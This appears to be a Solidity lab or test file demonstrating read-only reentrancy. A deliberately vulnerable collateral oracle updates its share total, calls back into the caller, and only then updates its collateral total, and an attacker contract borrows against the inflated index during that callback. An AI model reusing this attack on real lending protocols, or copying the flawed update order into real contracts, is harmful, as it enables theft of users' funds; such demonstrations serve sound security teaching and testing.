// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWithdrawCallback {
    function onCollateralWithdraw() external;
}

contract VulnerableCollateralOracle {
    mapping(address => uint256) public collateral;
    uint256 public totalCollateral;
    uint256 public totalShares;

    function seed(address user, uint256 amount) external {
        collateral[user] = amount;
        totalCollateral = amount;
        totalShares = amount;
    }

    function collateralIndex() external view returns (uint256) {
        return totalCollateral * 1e18 / totalShares;
    }

    function withdrawCollateral(uint256 shares) external {
        collateral[msg.sender] -= shares;
        totalShares -= shares;

        // Reentrancy window: totalShares changed, totalCollateral still old.
        IWithdrawCallback(msg.sender).onCollateralWithdraw();

        totalCollateral -= shares;
    }
}

contract VulnerableBorrowMarket {
    VulnerableCollateralOracle public immutable oracle;
    mapping(address => uint256) public debt;

    constructor(VulnerableCollateralOracle oracle_) {
        oracle = oracle_;
    }

    function borrow(uint256 collateralShares) external {
        uint256 value = collateralShares * oracle.collateralIndex() / 1e18;
        debt[msg.sender] += value * 75 / 100;
    }
}

contract LendingOracleRORAttacker is IWithdrawCallback {
    VulnerableCollateralOracle public oracle;
    VulnerableBorrowMarket public market;

    function attack(VulnerableCollateralOracle oracle_, VulnerableBorrowMarket market_) external {
        oracle = oracle_;
        market = market_;
        oracle.withdrawCollateral(oracle.collateral(address(this)) / 2);
    }

    function onCollateralWithdraw() external override {
        market.borrow(oracle.collateral(address(this)));
    }
}
